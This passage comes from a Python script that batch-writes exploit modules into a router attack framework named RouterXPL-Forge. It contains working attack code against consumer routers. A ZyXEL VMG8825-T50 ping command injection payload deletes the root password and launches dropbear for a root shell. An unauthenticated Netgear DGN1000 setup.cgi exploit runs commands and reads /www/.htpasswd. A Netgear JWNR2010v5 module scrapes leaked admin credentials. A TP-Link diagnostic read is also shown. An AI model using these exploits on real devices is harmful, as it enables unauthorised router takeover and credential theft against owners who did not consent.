            headers={"Content-Type": "text/plain"},
        )
        read = (
            "[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\\r\\n"
            "diagnosticsState\\r\\nX_TP_HopSeq\\r\\nX_TP_Result\\r\\n"
        )
        r = self.http_request(
            method="POST", path="/cgi?1", data=read,
            headers={"Content-Type": "text/plain"},
        )
        if r and r.text.strip():
            print_success("Output:")
            print_info(r.text.replace("[0,0,0,0,0,0]0", "").strip()[:2000])
        else:
            print_error("Requires valid auth cookie")

    @mute
    def check(self):
        return False
'''

MODULES[("zyxel", "vmg8825_ping_cmd_injection.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """ZyXEL VMG8825-T50 authenticated command injection."""

    __info__ = {
        "name": "ZyXEL VMG8825-T50 Ping Command Injection",
        "description": (
            "ZyXEL VMG8825-T50 is vulnerable to authenticated command injection "
            "via newline chars in the ping/traceroute Host parameter in the "
            "PINGTEST DAL endpoint. Enables root shell via dropbear."
        ),
        "authors": (
            "Thomas Rinsma",
            "André Henrique (@mrhenrike)",
        ),
        "references": ("https://github.com/ThomasRinsma/vmg8825scripts",),
        "devices": ("ZyXEL VMG8825-T50",),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        print_status("This exploit requires an authenticated session.")
        print_info("Payload: passwd -d root + dropbear -F -E -p 2222")
        print_info("Steps:")
        print_info("  1. Log in to the router web UI")
        print_info("  2. PUT to /cgi-bin/DAL?oid=PINGTEST&sessionkey=<key>")
        print_info('  3. Host = "a\\npasswd -d root\\ndropbear -F -E -p 2222\\n"')
        print_info("  4. ssh root@{} -p 2222".format(self.target))

    @mute
    def check(self):
        r = self.http_request(method="GET", path="/getBasicInformation")
        return r is not None and "VMG8825" in r.text
'''

MODULES[("netgear", "dgn1000_setup_cgi_rce.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Netgear DGN1000 setup.cgi unauthenticated RCE."""

    __info__ = {
        "name": "Netgear DGN1000 setup.cgi Command Execution",
        "description": (
            "Netgear DGN1000 allows unauthenticated command execution via "
            "the setup.cgi?todo=syscmd endpoint."
        ),
        "authors": (
            "oscommonjs",
            "André Henrique (@mrhenrike)",
        ),
        "references": ("https://www.exploit-db.com/exploits/25978",),
        "devices": ("Netgear DGN1000",),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        cmd = "cat /www/.htpasswd"
        path = ("/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd={}"
                "&curpath=/&currentsetting.htm").format(cmd)
        r = self.http_request(method="GET", path=path)
        if r and r.text.strip():
            print_success("Command output:")
            print_info(r.text[:2000])
        else:
            print_error("No response or empty output")

    @mute
    def check(self):
        path = ("/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=echo 741852"
                "&curpath=/&currentsetting.htm")
        r = self.http_request(method="GET", path=path)
        return r is not None and "741852" in r.text
'''

MODULES[("netgear", "jwnr2010v5_password_leak.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Netgear JWNR2010v5 unauthenticated password disclosure."""

    __info__ = {
        "name": "Netgear JWNR2010v5 Password Disclosure",
        "description": (
            "Netgear JWNR2010v5 leaks admin credentials via unauthenticated "
            "access to configuration pages."
        ),
        "authors": (
            "oscommonjs",
            "André Henrique (@mrhenrike)",
        ),
        "references": (),
        "devices": ("Netgear JWNR2010 v5",),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        for p in ("/currentsetting.htm", "/BRS_netgear_success.html",
                   "/passwordrecovered.cgi", "/unauth.cgi?id=2"):
            r = self.http_request(method="GET", path=p)
            if r and r.status_code == 200 and len(r.text) > 50:
                print_success("Data from {}:".format(p))
                print_info(r.text[:2000])
                return
        print_error("No accessible page found")

    @mute
    def check(self):
        r = self.http_request(method="GET", path="/currentsetting.htm")
        return r is not None and r.status_code == 200
'''


def main() -> None:
    print("=== RouterXPL-Forge Batch Import ===\n")
    created = 0
    for (vendor, filename), content in MODULES.items():
        write_module(vendor, filename, content)
        created += 1

    total = 0
    for root, _, files in os.walk(MODULES_BASE):
        total += sum(1 for f in files if f.endswith(".py") and f != "__init__.py")

    print(f"\n=== Done: {created} modules created ===")
    print(f"Total modules in routers/: {total}")


if __name__ == "__main__":
    main()
